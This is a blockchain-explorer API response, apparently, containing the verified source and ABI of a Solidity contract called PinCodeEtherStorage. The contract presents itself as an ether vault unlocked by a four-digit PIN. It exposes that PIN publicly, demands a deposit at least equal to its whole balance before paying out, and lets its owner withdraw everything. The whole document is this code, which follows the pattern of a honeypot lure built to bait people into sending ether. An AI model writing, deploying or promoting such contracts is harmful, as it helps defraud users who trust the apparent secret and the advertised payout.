{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.4.19;\r\ncontract PinCodeEtherStorage {\r\n\t// Store some money with a 4 digit code\r\n\t\r\n    address private Owner = msg.sender;\r\n    uint public PinCode = 2658;\r\n\r\n    function() public payable {}\r\n    function PinCodeEtherStorage() public payable {}\r\n   \r\n    function Withdraw() public {\r\n        require(msg.sender == Owner);\r\n        Owner.transfer(this.balance);\r\n    }\r\n    \r\n    function Take(uint n) public payable {\r\n\t\tif(msg.value >= this.balance && msg.value > 0.1 ether)\r\n\t\t\t// To prevent random guesses, you have to send some money\r\n\t\t\t// Random Guess = money lost\r\n\t\t\tif(n <= 9999 && n == PinCode)\r\n\t\t\t\tmsg.sender.transfer(this.balance+msg.value);\r\n    }\r\n}","ABI":"[{\"constant\":false,\"inputs\":[],\"name\":\"Withdraw\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"PinCode\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"n\",\"type\":\"uint256\"}],\"name\":\"Take\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"}]","ContractName":"PinCodeEtherStorage","CompilerVersion":"v0.4.19+commit.c4cbbb05","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":"bzzr://2e05c3cafd72ae829a0586eb766dd4ceaa293f63ce60c0f3fc34df2f9c9b52df"}]}